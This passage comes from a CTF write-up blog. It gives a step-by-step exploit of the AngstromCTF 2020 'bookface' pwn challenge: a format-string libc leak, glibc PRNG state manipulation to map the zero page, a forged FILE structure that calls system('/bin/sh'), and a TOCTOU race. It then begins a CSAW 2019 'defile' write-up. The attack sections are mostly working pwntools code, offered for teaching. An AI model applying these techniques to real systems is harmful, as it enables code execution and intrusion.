&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gef&amp;gt; p 0x00007ffff7a2d830 - 0x00007ffff7a0d000
$2 = 0x20830
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;libc-address-leak-exploit&#34;&gt;libc address leak exploit&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;libc_offset = 0x20830
uid = randint(0, 2**30)
# create user with uid and name AAAA
T.sendlineafter(&amp;quot;Please enter your user ID: &amp;quot;, str(uid))
T.sendlineafter(&amp;quot;What&#39;s your name? &amp;quot;, b&amp;quot;AAAA&amp;quot;)
# logout
T.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;4&amp;quot;)
# login again with same uid
T.sendlineafter(&amp;quot;Please enter your user ID: &amp;quot;, str(uid))
# format string offset
payload = b&#39;AA%35$pBB&#39;
assert len(payload) &amp;lt;= 12
T.sendlineafter(&amp;quot;Content: &amp;quot;, payload)
T.recvuntil(b&#39;AA&#39;)
leak = T.recvuntil(b&#39;BB&#39;).strip(b&#39;BB&#39;)
leak = int(leak, base=16)
log.info(&amp;quot;leak: 0x{:016x}&amp;quot;.format(leak))
libc_base = leak - libc_offset
log.info(&amp;quot;libc_base: 0x{:016x}&amp;quot;.format(libc_base))
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;zero-page&#34;&gt;Zero Page&lt;/h4&gt;
&lt;p&gt;We need to write the forged &lt;em&gt;FILE&lt;/em&gt; structure into the &lt;em&gt;Zero Page&lt;/em&gt; (i.e. memory page at &lt;em&gt;0x0000000000000000&lt;/em&gt;), when login with a new userid the following instruction will be executed:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;puts(&amp;quot;Welcome to bookface!&amp;quot;);
user = mmap(rand()&amp;amp;0xfffffffffffff000, sizeof (struct profile), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
printf(&amp;quot;What&#39;s your name? &amp;quot;);
fgets(user-&amp;gt;name, 0x100, stdin);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;mmap&lt;/code&gt; will map a page at &lt;code&gt;rand() &amp;amp; 0xfffffffffffff000&lt;/code&gt;, there are two ways (maybe more) to make that value be zero:&lt;/p&gt;
&lt;h4 id=&#34;1-easy-dirty-way-brutforce&#34;&gt;1. Easy dirty way &amp;ldquo;Brutforce&amp;rdquo;:&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;rand()&lt;/code&gt; (see &lt;code&gt;man 3 rand&lt;/code&gt;) will return a pseudo-random integer in range &lt;code&gt;[0, RAND_MAX]&lt;/code&gt;, &lt;code&gt;RAND_MAX&lt;/code&gt; dependent on the implementation, but it&amp;rsquo;s guaranteed that this value is at least &lt;em&gt;32767&lt;/em&gt; (&lt;em&gt;0x7fff&lt;/em&gt;)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:6&#34;&gt;&lt;a href=&#34;#fn:6&#34;&gt;6&lt;/a&gt;&lt;/sup&gt;. there is a chance that &lt;code&gt;rand()&lt;/code&gt; will return a integer less than &lt;em&gt;0x1000&lt;/em&gt;.&lt;/p&gt;
&lt;h4 id=&#34;2-hard-efficient-way-abusing-glibc-prng&#34;&gt;2. Hard efficient way &amp;ldquo;Abusing glibc PRNG&amp;rdquo;:&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;glibc&lt;/em&gt; pseudo-random-number-generator (&lt;em&gt;PRNG&lt;/em&gt;)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7&#34;&gt;&lt;a href=&#34;#fn:7&#34;&gt;7&lt;/a&gt;&lt;/sup&gt; like any &lt;em&gt;PRNG&lt;/em&gt; generates a sequence of random numbers, this sequence is not truly random, because it is determined by the &lt;em&gt;PRNG&lt;/em&gt;&amp;rsquo;s state which is initially the seed value set by &lt;code&gt;srand&lt;/code&gt;, in our case it is &lt;code&gt;time(NULL)&lt;/code&gt;, &lt;em&gt;glibc PRNG&lt;/em&gt; (see &lt;code&gt;man 3 rand&lt;/code&gt;) use hidden state that is modified on each call, this hidden state is probably located at writable memory in libc address space.&lt;/p&gt;
&lt;p&gt;To find how &lt;em&gt;glibc PRNG&lt;/em&gt; works we need to dig deeper in &lt;em&gt;glibc&lt;/em&gt; source code, I usually use &lt;strong&gt;Bootlin - Elixir Cross Referencer&lt;/strong&gt; &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:8&#34;&gt;&lt;a href=&#34;#fn:8&#34;&gt;8&lt;/a&gt;&lt;/sup&gt; to browse Linux Kernel and Glibc source code, actually the &lt;code&gt;rand&lt;/code&gt; function is just wrapper to &lt;code&gt;__random&lt;/code&gt; and the latter is also a wrapper to &lt;code&gt;__random_r&lt;/code&gt;, make sure you are browsing the correct glibc version &lt;strong&gt;glibc-2.23&lt;/strong&gt; &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:9&#34;&gt;&lt;a href=&#34;#fn:9&#34;&gt;9&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int
rand (void)
{
return (int) __random ();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;long int
__random (void)
{
int32_t retval;
__libc_lock_lock (lock);
(void) __random_r (&amp;amp;unsafe_state, &amp;amp;retval);
__libc_lock_unlock (lock);
return retval;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;__random_r&lt;/code&gt; is defined in &lt;code&gt;stdlib/random_r.c&lt;/code&gt; line &lt;code&gt;353&lt;/code&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:10&#34;&gt;&lt;a href=&#34;#fn:10&#34;&gt;10&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;
int
__random_r (struct random_data *buf, int32_t *result)
{
int32_t *state;
if (buf == NULL || result == NULL)
goto fail;
state = buf-&amp;gt;state;
if (buf-&amp;gt;rand_type == TYPE_0)
{
int32_t val = state[0];
val = ((state[0] * 1103515245) + 12345) &amp;amp; 0x7fffffff;
state[0] = val;
*result = val;
}
else
{
int32_t *fptr = buf-&amp;gt;fptr;
int32_t *rptr = buf-&amp;gt;rptr;
int32_t *end_ptr = buf-&amp;gt;end_ptr;
int32_t val;
val = *fptr += *rptr;
/* Chucking least random bit. */
*result = (val &amp;gt;&amp;gt; 1) &amp;amp; 0x7fffffff;
++fptr;
if (fptr &amp;gt;= end_ptr)
{
fptr = state;
++rptr;
}
else
{
++rptr;
if (rptr &amp;gt;= end_ptr)
rptr = state;
}
buf-&amp;gt;fptr = fptr;
buf-&amp;gt;rptr = rptr;
}
return 0;
fail:
__set_errno (EINVAL);
return -1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;At the beginning of the function there is a test for the random type, from code comments we see that there two types, if &lt;code&gt;rand_type == TYPE_0&lt;/code&gt; the old linear congruential bit will be used. Otherwise, the fancy trinomial stuff.&lt;/p&gt;
&lt;p&gt;We don&amp;rsquo;t know which one is beening used in our libc, we will use a debugger to figure it out.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;gef&amp;gt; disas random_r
Dump of assembler code for function random_r:
0x00007ffff7a47c40 &amp;lt;+0&amp;gt;: test rdi,rdi
0x00007ffff7a47c43 &amp;lt;+3&amp;gt;: je 0x7ffff7a47cc0 &amp;lt;random_r+128&amp;gt;
0x00007ffff7a47c45 &amp;lt;+5&amp;gt;: test rsi,rsi
0x00007ffff7a47c48 &amp;lt;+8&amp;gt;: je 0x7ffff7a47cc0 &amp;lt;random_r+128&amp;gt;
0x00007ffff7a47c4a &amp;lt;+10&amp;gt;: mov eax,DWORD PTR [rdi+0x18]
0x00007ffff7a47c4d &amp;lt;+13&amp;gt;: mov r8,QWORD PTR [rdi+0x10]
0x00007ffff7a47c51 &amp;lt;+17&amp;gt;: test eax,eax
0x00007ffff7a47c53 &amp;lt;+19&amp;gt;: je 0x7ffff7a47ca0 &amp;lt;random_r+96&amp;gt;
0x00007ffff7a47c55 &amp;lt;+21&amp;gt;: mov rax,QWORD PTR [rdi]
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The condition is at *&lt;em&gt;random_r+17&lt;/em&gt;, set a break point there and examin &lt;em&gt;rax&lt;/em&gt; register&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;gef&amp;gt; run
...
gef&amp;gt; b *random_r+17
....
gef&amp;gt; continue
....
gef&amp;gt; info registers rax
rax 0x3 0x3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The random type isn&amp;rsquo;t &lt;code&gt;TYPE_0&lt;/code&gt;, so the 2nd part of code will be used to compute the next random integer, it will be written to the 2nd parameter &lt;code&gt;int32_t *result&lt;/code&gt; which is the &lt;code&gt;retval&lt;/code&gt; variable in &lt;code&gt;__random&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;the result is &lt;code&gt;*result = (val &amp;gt;&amp;gt; 1) &amp;amp; 0x7fffffff&lt;/code&gt; and &lt;code&gt;val = *fptr += *rptr&lt;/code&gt;, so in order to make &lt;code&gt;rand()&lt;/code&gt; return a 0 we need to overwrite &lt;code&gt;*fptr&lt;/code&gt; and &lt;code&gt;*rptr&lt;/code&gt; with zero (i.e. val = 0 =&amp;gt; *result = 0 ), those two pointer change after each call to random, we need to find the right ones for the right call, (e.g. if we want the 2nd call returns 0, we call rand once then debug the 2nd call to get the right pointers), this is the eays way to get them.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int32_t *fptr = buf-&amp;gt;fptr;
int32_t *rptr = buf-&amp;gt;rptr;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This piece of code corespands to:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; 0x7f7aa7c72c56 &amp;lt;random_r+22&amp;gt; mov eax, DWORD PTR [rdi]
0x7f7aa7c72c58 &amp;lt;random_r+24&amp;gt; mov rcx, QWORD PTR [rdi+0x8]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The values of &lt;code&gt;fptr&lt;/code&gt; and &lt;code&gt;rptr&lt;/code&gt; will &lt;code&gt;rax&lt;/code&gt; and &lt;code&gt;rcx&lt;/code&gt; respectivly&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gef&amp;gt; b *random_r+24
...
gef&amp;gt; i r rax rcx
rax 0x7f7aa7ffc0c4 0x7f7aa7ffc0c4
rcx 0x7f7aa7ffc0b8 0x7f7aa7ffc0b8
gef➤ p 0x7f7aa7ffc0b8 - 0x00007f7aa7c38000
$1 = 0x3c40b8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the offset to &lt;code&gt;*rptr&lt;/code&gt; is &lt;code&gt;0x3c40b8&lt;/code&gt; while &lt;code&gt;*fptr&lt;/code&gt; is &lt;code&gt;0x3c40c4&lt;/code&gt;, &lt;em&gt;12&lt;/em&gt; bytes distance bitween them.&lt;/p&gt;
&lt;p&gt;We can overwrite this address with null value using the &lt;code&gt;friends&lt;/code&gt; pointer in &lt;code&gt;profile&lt;/code&gt; structure, we will use option one to increment it to points to &lt;code&gt;*rptr&lt;/code&gt;, overwrite with zero then do the same to &lt;code&gt;*fptr&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The friends pointer is of type &lt;code&gt;long long*&lt;/code&gt; and it equals to 0 initialy, in pointer arithmetic for a given pointer &lt;code&gt;x&lt;/code&gt;, &lt;code&gt;x + 5&lt;/code&gt; actually is &lt;code&gt;x + 5*sizeof(data_type)&lt;/code&gt;, we have &lt;code&gt;sizeof(long long) == 8&lt;/code&gt;, so we increment friends pointer with &lt;code&gt;(*rptr address) / 8&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&#34;set-random-state-fptr-and-rptr-to-0&#34;&gt;Set random state fptr and rptr to 0&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;random_state_offset = 0x3c40b8
random_state = libc_base + random_state_offset
# set random_state fptr and rptr to 0
# in order to make rand() return 0
# fptr
T.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)
T.sendlineafter(&amp;quot;you like to make? &amp;quot;, str(random_state//8))
# logout
T.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;4&amp;quot;)
# login again with the same
T.sendlineafter(&amp;quot;Please enter your user ID: &amp;quot;, str(uid))
T.sendlineafter(&amp;quot;Content: &amp;quot;, b&#39;A&#39;*11)
T.sendlineafter(&amp;quot;Content: &amp;quot;, b&#39;A&#39;*11)
# rptr = rptr + 8
T.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)
T.sendlineafter(&amp;quot;you like to make? &amp;quot;, str(8//8))
# logout
T.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;4&amp;quot;)
# login again with the same uid
T.sendlineafter(&amp;quot;Please enter your user ID: &amp;quot;, str(uid))
T.sendlineafter(&amp;quot;Content: &amp;quot;, b&#39;A&#39;*11)
T.sendlineafter(&amp;quot;Content: &amp;quot;, b&#39;A&#39;*11)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After that will login with a new userid in order to allocate a &lt;em&gt;Zero Page&lt;/em&gt; and write into it the forged &lt;em&gt;FILE&lt;/em&gt; structure.&lt;/p&gt;
&lt;p&gt;I used the same code in &lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34;&gt;5&lt;/a&gt;&lt;/sup&gt; with little modification to make the &lt;em&gt;FILE&lt;/em&gt; structure.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def pack_file(_flags=0,
_IO_read_ptr=0,
_IO_read_end=0,
_IO_read_base=0,
_IO_write_base=0,
_IO_write_ptr=0,
_IO_write_end=0,
_IO_buf_base=0,
_IO_buf_end=0,
_IO_save_base=0,
_IO_backup_base=0,
_IO_save_end=0,
_IO_marker=0,
_IO_chain=0,
_fileno=0,
_lock=0):
struct = p32(_flags) + \
p32(0) + \
p64(_IO_read_ptr) + \
p64(_IO_read_end) + \
p64(_IO_read_base) + \
p64(_IO_write_base) + \
p64(_IO_write_ptr) + \
p64(_IO_write_end) + \
p64(_IO_buf_base) + \
p64(_IO_buf_end) + \
p64(_IO_save_base) + \
p64(_IO_backup_base) + \
p64(_IO_save_end) + \
p64(_IO_marker) + \
p64(_IO_chain) + \
p32(_fileno)
struct = struct.ljust(0x88, b&amp;quot;\x00&amp;quot;)
struct += p64(_lock)
struct = struct.ljust(0xd8, b&amp;quot;\x00&amp;quot;)
return struct
def make_fake_file_struct(libc_base, rip, rdi):
# We can only have even rdi
assert(rdi % 2 == 0)
# Crafting FILE structure
# This stores the address of a pointer to the _IO_str_overflow function
# Libc specific
io_str_overflow_ptr_addr = libc_base + \
libc.symbols[&#39;_IO_file_jumps&#39;] + 0xd8
# Calculate the vtable by subtracting appropriate offset
fake_vtable_addr = io_str_overflow_ptr_addr - 2*8
# Craft file struct
file_struct = pack_file(_IO_buf_base=0,
_IO_buf_end=(rdi-100)//2,
_IO_write_ptr=(rdi-100)//2,
_IO_write_base=0,
_lock=0)
# vtable pointer
file_struct += p64(fake_vtable_addr)
# Next entry corresponds to: (*((_IO_strfile *) fp)-&amp;gt;_s._allocate_buffer)
file_struct += p64(rip)
return file_struct
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# logout
T.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;4&amp;quot;)
# login again with wrong uid
uid = randint(0, 2**30)
T.sendlineafter(&amp;quot;Please enter your user ID: &amp;quot;, str(uid))
raw_input(&amp;quot;&amp;gt; Debug&amp;quot;)
# Our target
# mmap to 0
file_addr = 0
rip = libc_base + libc.symbols[&#39;system&#39;]
# rdi = libc_base + next(libc.search(b&amp;quot;/bin/sh&amp;quot;)) # The first param we want
# next to file_struct
rdi = 0xf0
log.info(&amp;quot;file_addr 0x{:016x}&amp;quot;.format(file_addr))
log.info(&amp;quot;rip 0x{:016x}&amp;quot;.format(rip))
log.info(&amp;quot;rdi 0x{:016x}&amp;quot;.format(rdi))
file_struct = make_fake_file_struct(libc_base, rip, rdi)
file_struct = file_struct.ljust(0xf0, b&#39;\x00&#39;)
payload = file_struct + b&#39;/bin/sh\x00&#39;
assert b&#39;\n&#39; not in payload
T.sendlineafter(&amp;quot;What&#39;s your name? &amp;quot;, payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;N.B.&lt;/strong&gt; The &lt;em&gt;rdi&lt;/em&gt; parameter must be even, the offset of &lt;code&gt;/bin/sh&lt;/code&gt; string in this libc isn&amp;rsquo;t even, we can&amp;rsquo;t use it, so we&amp;rsquo;ll write the &lt;code&gt;/bin/sh&lt;/code&gt; string after the &lt;em&gt;FILE&lt;/em&gt; structure, it&amp;rsquo;s aligned to &lt;em&gt;0xf0&lt;/em&gt;, so the string will be at &lt;em&gt;0x00000000000000f0&lt;/em&gt; (since mmap maps the zero page at &lt;em&gt;0x0000000000000000&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;To triger to exploit we must call &lt;code&gt;fclose&lt;/code&gt; with &lt;em&gt;NULL&lt;/em&gt; pointer as parameter. So the call to &lt;code&gt;fopen&lt;/code&gt; must fail and return &lt;em&gt;NULL&lt;/em&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;FILE *f = fopen(file, &amp;quot;rb&amp;quot;);
fread(user, 1, sizeof (struct profile), f);
fclose(f);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;How can &lt;code&gt;fopen(file, &amp;quot;rb&amp;quot;)&lt;/code&gt; fails? the mode string is &lt;code&gt;&amp;quot;rb&amp;quot;&lt;/code&gt;, it&amp;rsquo;s a read, so if the file doesn&amp;rsquo;t exists fopen will fail and return NULL.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Login&lt;/code&gt; function check if the file exists with &lt;code&gt;access&lt;/code&gt; then asks for the survey, where there are multiple calls to &lt;code&gt;read&lt;/code&gt;, it&amp;rsquo;s a blocking function, it will block and wait for user input. This is a &lt;code&gt;Time-of-check to time-of-use&lt;/code&gt; (TOCTOU)&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:11&#34;&gt;&lt;a href=&#34;#fn:11&#34;&gt;11&lt;/a&gt;&lt;/sup&gt; bug.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll open another connection and use the same userid to remove the file using the 3rd option &lt;em&gt;&amp;ldquo;deleting account&amp;rdquo;&lt;/em&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# logout
T.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;4&amp;quot;)
# login again with the last uid
T.sendlineafter(&amp;quot;Please enter your user ID: &amp;quot;, str(uid))
# remove the uid user file with another connection
# TOCTOU
raw_input(&amp;quot;&amp;gt; debug&amp;quot;)
log.info(&amp;quot;uid: {}&amp;quot;.format(uid))
log.info(&amp;quot;race condition !!&amp;quot;)
T2 = remote(T.rhost, T.rport)
T2.sendlineafter(&amp;quot;Please enter your user ID: &amp;quot;, str(uid))
T2.sendlineafter(&amp;quot;Content&amp;quot;, b&amp;quot;10\n10\n10\n10&amp;quot;)
T2.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;3&amp;quot;)
payload = b&#39;10\n10\n10\n10\n&#39;
assert len(payload) &amp;lt;= 12
T.sendlineafter(&amp;quot;Content: &amp;quot;, payload)
T.clean()
T.sendline(&amp;quot;uname -a;id&amp;quot;)
T.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;final-exploit&#34;&gt;Final Exploit&lt;/h3&gt;
&lt;p&gt;You can find the full exploit &lt;a href=&#34;https://philomath213.github.io/post/AngstromCTF2020-bookface/exploit_bookface.py&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://philomath213.github.io/post/AngstromCTF2020-bookface/screenshot1.png&#34; alt=&#34;screenshot1&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;div class=&#34;footnotes&#34;&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34;&gt;&lt;a href=&#34;https://www.ayrx.me/using-a-non-system-libc&#34; target=&#34;_blank&#34;&gt;Using a non-system glibc&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:1&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:2&#34;&gt;&lt;a href=&#34;https://wiki.debian.org/mmap_min_addr&#34; target=&#34;_blank&#34;&gt;Debian Wiki - mmap_min_addr&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:2&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:3&#34;&gt;&lt;a href=&#34;http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Linux%20Kernel%20Exploitation%20-%20Patrick%20Biernat.pdf&#34; target=&#34;_blank&#34;&gt;Patrick Biernat - Linux Kernel Exploitation&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:3&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:4&#34;&gt;&lt;a href=&#34;https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf&#34; target=&#34;_blank&#34;&gt;FILE Structures: Another Binary Exploitation Technique&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:4&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:5&#34;&gt;&lt;a href=&#34;https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/&#34; target=&#34;_blank&#34;&gt;Dhaval Kapil - FILE Structure Exploitation (&amp;lsquo;vtable&amp;rsquo; check bypass)&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:5&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:6&#34;&gt;&lt;a href=&#34;https://en.cppreference.com/w/cpp/numeric/random/RAND_MAX&#34; target=&#34;_blank&#34;&gt;C++ reference - RAND_MAX&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:6&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:7&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Pseudorandom_number_generator&#34; target=&#34;_blank&#34;&gt;Wikipedia - Pseudorandom number generator&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:7&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:8&#34;&gt;&lt;a href=&#34;https://elixir.bootlin.com/&#34; target=&#34;_blank&#34;&gt;Bootlin - Elixir Cross Referencer&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:8&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:9&#34;&gt;&lt;a href=&#34;https://elixir.bootlin.com/glibc/glibc-2.23/source&#34; target=&#34;_blank&#34;&gt;Bootlin Elixir - glibc-2.23&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:9&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:10&#34;&gt;&lt;a href=&#34;https://elixir.bootlin.com/glibc/glibc-2.23/source/stdlib/random_r.c#L353&#34; target=&#34;_blank&#34;&gt;glibc-2.23 - __random_r&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:10&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:11&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use&#34; target=&#34;_blank&#34;&gt;Time-Of-Check To Time-Of-Use&lt;/a&gt;
&lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:11&#34;&gt;&lt;sup&gt;^&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</description></item><item><title>CSAW CTF Finals 2019 - defile</title><link>https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/</link><pubDate>Mon, 11 Nov 2019 14:47:14 +0100</pubDate><guid>https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/</guid><description>
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;CSAW CTF Final 2019&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;defile&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;100&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;wild handlock main btw&lt;/p&gt;
&lt;p&gt;nc pwn.chal.csaw.io 1004&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;attachments&#34;&gt;Attachments&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/osirislab/CSAW-CTF-2019-Finals/blob/master/pwn/defile/defile?raw=true&#34; target=&#34;_blank&#34;&gt;defile&lt;/a&gt;
&lt;a href=&#34;https://github.com/osirislab/CSAW-CTF-2019-Finals/raw/master/pwn/defile/libc.so.6&#34; target=&#34;_blank&#34;&gt;libc.so.6&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The binary is a dynamically linked ELF 64-bit executable, it has all protections enabled.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ file defile
defile: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5631f2588790fa344f6f360d39819963f4f66d7f, not stripped
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ checksec --file defile
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When running this binary, it will give you the address of &lt;code&gt;stdout&lt;/code&gt; in &lt;code&gt;libc&lt;/code&gt;, and ask for &lt;code&gt;How much do you want to write?&lt;/code&gt;, &lt;code&gt;Where do you want to write?&lt;/code&gt; and &lt;code&gt;What do you want to write?&lt;/code&gt;, then print &lt;code&gt;Bye!&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://philomath213.github.io/post/CSAW-CTF-Finals-2019-defile/screenshot0.png&#34; alt=&#34;screenshot0&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So it looks like an intended vulnerability, we have an arbitrary write.&lt;/p&gt;
&lt;p&gt;After analyzing the binary, I found that the binary have two functions: &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;get_number&lt;/code&gt;, the &lt;code&gt;get_number&lt;/code&gt; function simply read an &lt;code&gt;unsigned long&lt;/code&gt; from &lt;code&gt;stdin&lt;/code&gt; and return it, while the &lt;code&gt;main&lt;/code&gt; function ask for the input size then check if the &lt;code&gt;size &amp;lt;= 256&lt;/code&gt; otherwise it will print &lt;code&gt;That&#39;s just too much&lt;/code&gt;, then it ask for the address where to write and finally read the input by calling &lt;code&gt;read&lt;/code&gt; function with the parameters &lt;code&gt;read(0, buf, nbytes)&lt;/code&gt;, where &lt;code&gt;buf&lt;/code&gt; is the address we provided and &lt;code&gt;nbytes&lt;/code&gt; the size of input.&lt;/p&gt;
